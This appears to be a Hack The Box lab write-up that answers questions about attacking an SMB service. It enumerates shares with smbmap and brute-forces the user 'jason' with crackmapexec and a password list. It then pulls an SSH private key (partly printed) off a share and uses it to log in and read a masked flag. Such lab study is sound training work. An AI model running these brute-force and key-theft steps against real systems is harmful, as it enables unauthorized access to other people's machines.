## Questions:

### What is the name of the shared folder with READ permissions?

```
smbmap -H $TARGET_IP
[+] IP: TARGET_IP:445	Name: TARGET                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)

```

### What is the password for the username "jason"?
* First, load pwd.list from resources.
```
crackmapexec smb $TARGET_IP -u jason -p pwd.list --local-auth
```

### Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

``` 
smbclient  //$TARGET_IP/GGJ -U 'jason%$PASSWORD' -

smb: \> ls
  .                                   D        0  Tue Apr 19 16:33:55 2022
  ..                                  D        0  Mon Apr 18 12:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 16:33:04 2022

		14384136 blocks of size 1024. 10088352 blocks available
smb: \> get id_rsa
getting file \id_rsa of size 3381 as id_rsa (89.2 KiloBytes/sec) (average 89.2 KiloBytes/sec)
smb: \> !cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA1RKythwhDQVnsZpGDDeIWh/z0a4y5mQoIIBXOeHJM8rLNzB/fdMD
XvN+6R6s0wh/fpava2en2s/G6m8OGjjY8DbgO0A40HwzKyVEKk15tJ9QlcaqS0O77UrjW/
...
<SNIP>
....
```
```
 [★]$ ls
cacert.der  Documents  id_rsa  Pictures  pwd.list   Videos
Desktop     Downloads  Music   Public    Templates

```
```
chmod 600 id_rsa
ssh -i id_rsa jason@$TARGET_IP
cat flag.txt
HTB{SMB_*******_*********9}
```
# [Subscribe for getting more HTB Cubes!](https://referral.hackthebox.com/mzyGKZb)
